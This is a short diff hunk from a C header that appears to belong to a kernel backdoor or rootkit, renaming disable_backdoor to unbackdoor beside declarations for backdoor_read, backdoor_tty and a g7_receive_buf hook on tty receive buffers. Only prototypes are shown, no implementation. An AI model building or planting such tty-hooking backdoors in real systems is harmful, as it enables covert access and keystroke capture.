@@ -5,7 +5,7 @@
 
 void backdoor_read(void);
 void backdoor_tty(void);
-void disable_backdoor(void);
+void unbackdoor(void);
 
 // hooks
 void g7_receive_buf(struct tty_struct *, const unsigned char *, char *, int);
